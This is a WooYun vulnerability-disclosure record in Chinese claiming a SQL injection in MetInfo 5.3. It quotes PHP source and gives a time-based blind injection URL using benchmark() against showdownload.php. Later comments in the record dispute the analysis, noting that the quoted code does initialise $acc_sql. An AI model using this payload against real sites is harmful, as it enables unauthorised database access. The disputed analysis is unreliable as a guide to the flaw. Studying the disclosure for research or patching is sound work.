{"id": 84558, "wybug_id": "wooyun-2015-0144354", "wybug_title": "MetInfo最新版SQL注入一枚", "wybug_corp": "MetInfo", "wybug_author": "Xser", "wybug_date": "2015-10-01 09:34", "wybug_open_date": "2016-01-11 15:32", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-02：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-05：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-11-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-11：\t细节向公众公开  简要描述： 未初始化问题 详细说明：  出现在MetInfo5.3/include/global/showmod.php中\nif($dataoptimize[$pagemark]['nextlist']){\tif($met_pnorder==1){\t\t$csql=\"class1='$class1' and class2='$class2' and class3='$class3'\";\t\t$cpnorder=$class3?$class_list[$class3]['list_order']:($class2?$class_list[$class2]['list_order']:$class_list[$class1]['list_order']);\t\t\t}\telse{\t\t$csql=\"class1='$class1'\";\t\t$cpnorder=$class_list[$class1]['list_order'];\t}\t$acc_sql=$met_member_use==2?\"(access<='$metinfo_member_type') and\":\"\";\t$pn_sql=pn_order($cpnorder,$news);\tif($cpnorder<4){\t\t$allnews=$db->get_all(\"select * from $dbname where $csql and lang='$lang' and (recycle='0' or recycle='-1') and $acc_sql $pn_sql[2]\");\t\t$allnum=count($allnews);\t\tif($allnum>1){\t\t\tforeach($allnews as $keyall=>$valall){\t\t\t\tif($valall['id']==$id){\t\t\t\t\tif(is_array($allnews[$keyall-1])){\t\t\t\t\t\tif($keyall-1>=0){$prenews=$allnews[$keyall-1];}\t\t\t\t\t}\t\t\t\t\tif(is_array($allnews[$keyall+1])){\t\t\t\t\t\tif($keyall+1<=$allnum){$nextnews=$allnews[$keyall+1];}\t\t\t\t\t}\n\n$acc_sql没有初始化而且没单引号可以覆盖注入\n进去这一步if($met_pnorder==1){\t\t$csql=\"class1='$class1' and class2='$class2' and class3='$class3'\";\t\t$cpnorder=$class3?$class_list[$class3]['list_order']:($class2?$class_list[$class2]['list_order']:$class_list[$class1]['list_order']); \t}可以覆盖了\n\n看看数据库日志\n\n成功带入字符构造exp\n**.**.**.**/MetInfo5.3/download/showdownload.php?id=1&acc_sql=aaaa or if(ascii(mid(user(),1,1))=114,benchmark(10000000,md5(2)),1)%23\n   漏洞证明：  出现在MetInfo5.3/include/global/showmod.php中\nif($dataoptimize[$pagemark]['nextlist']){\tif($met_pnorder==1){\t\t$csql=\"class1='$class1' and class2='$class2' and class3='$class3'\";\t\t$cpnorder=$class3?$class_list[$class3]['list_order']:($class2?$class_list[$class2]['list_order']:$class_list[$class1]['list_order']);\t\t\t}\telse{\t\t$csql=\"class1='$class1'\";\t\t$cpnorder=$class_list[$class1]['list_order'];\t}\t$acc_sql=$met_member_use==2?\"(access<='$metinfo_member_type') and\":\"\";\t$pn_sql=pn_order($cpnorder,$news);\tif($cpnorder<4){\t\t$allnews=$db->get_all(\"select * from $dbname where $csql and lang='$lang' and (recycle='0' or recycle='-1') and $acc_sql $pn_sql[2]\");\t\t$allnum=count($allnews);\t\tif($allnum>1){\t\t\tforeach($allnews as $keyall=>$valall){\t\t\t\tif($valall['id']==$id){\t\t\t\t\tif(is_array($allnews[$keyall-1])){\t\t\t\t\t\tif($keyall-1>=0){$prenews=$allnews[$keyall-1];}\t\t\t\t\t}\t\t\t\t\tif(is_array($allnews[$keyall+1])){\t\t\t\t\t\tif($keyall+1<=$allnum){$nextnews=$allnews[$keyall+1];}\t\t\t\t\t}\n\n$acc_sql没有初始化而且没单引号可以覆盖注入\n进去这一步if($met_pnorder==1){\t\t$csql=\"class1='$class1' and class2='$class2' and class3='$class3'\";\t\t$cpnorder=$class3?$class_list[$class3]['list_order']:($class2?$class_list[$class2]['list_order']:$class_list[$class1]['list_order']); \t}可以覆盖了\n\n看看数据库日志\n\n成功带入字符构造exp\n**.**.**.**/MetInfo5.3/download/showdownload.php?id=1&acc_sql=aaaa or if(ascii(mid(user(),1,1))=114,benchmark(10000000,md5(2)),1)%23\n   修复方案：     版权声明：转载请注明来源 Xser@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-10-02 13:13 厂商回复： 系统漏洞后续版本修复，感谢反馈！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-01-13 21:12 |    \t\t李小弟 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | \\-)(-/)\t\t \n  我智商严重不够啊？$acc_sql=$met_member_use==2?\"(access<='$metinfo_member_type') and\":\"\";这句不是初始化是什么？if之后必定执行此初始化语句，球大神解释，我智商不够    \n     2016-01-21 20:06 |    \t\t淡蓝色の忧伤 \t\t\t( 普通白帽子  |\t\t\t        Rank:176 漏洞数:27        | 开启审计php代码模式      (⊙v⊙)嗯)\t\t \n  @李小弟 这个漏洞有问题 $acc_sql=$met_member_use==2?\"(access<='$metinfo_member_type') and\":\"\"; 这句就是初始化    \n     2016-01-22 16:14 |    \t\t李小弟 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | \\-)(-/)\t\t \n  @淡蓝色の忧伤 我还以为就我一个人读代码。。。。你把存货亮出来吧，不要再藏了，让他们年末也加加班。。。你要是再不亮出来，我可要抢你风头了    \n     2016-01-22 18:28 |    \t\t淡蓝色の忧伤 \t\t\t( 普通白帽子  |\t\t\t        Rank:176 漏洞数:27        | 开启审计php代码模式      (⊙v⊙)嗯)\t\t \n  @李小弟 考试还没考完~~~~(>_<)~~~~，哪有时间搞这个    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}